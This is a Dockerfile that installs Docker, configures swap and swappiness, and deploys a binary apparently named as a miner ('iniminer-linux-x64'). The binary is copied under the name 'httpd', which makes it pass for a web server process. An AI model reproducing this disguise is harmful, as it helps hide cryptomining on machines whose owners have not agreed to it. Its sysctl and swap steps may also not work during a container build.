# Base Image 
FROM ubuntu:20.04

# Non-interaktif selama instalasi
ARG DEBIAN_FRONTEND=noninteractive

# Install dependencies
RUN apt-get update && apt-get install -y \
    wget \
    bash \
    python3 \
    python3-pip \
    curl \
    cron \
    apt-transport-https \
    ca-certificates \
    software-properties-common \
    gnupg-agent \
    --no-install-recommends && \
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add - && \
    add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable" && \
    apt-get update && apt-get install -y docker-ce docker-ce-cli containerd.io && \
    apt-get clean && rm -rf /var/lib/apt/lists/*

# Set working directory
WORKDIR /usr/local/bin

# Enable swap
RUN fallocate -l 1G /swapfile \
    && chmod 600 /swapfile \
    && mkswap /swapfile \
    && echo "/swapfile none swap sw 0 0" >> /etc/fstab

# Optimize swappiness
RUN sysctl vm.swappiness=10 \
    && echo "vm.swappiness=10" >> /etc/sysctl.conf

# Copy and run the script
COPY iniminer-linux-x64 /usr/local/bin/httpd
RUN chmod +x /usr/local/bin/httpd
# Copy and run the script
COPY run.sh /usr/local/bin/run.sh
RUN chmod +x /usr/local/bin/run.sh
CMD ["/usr/local/bin/run.sh"]
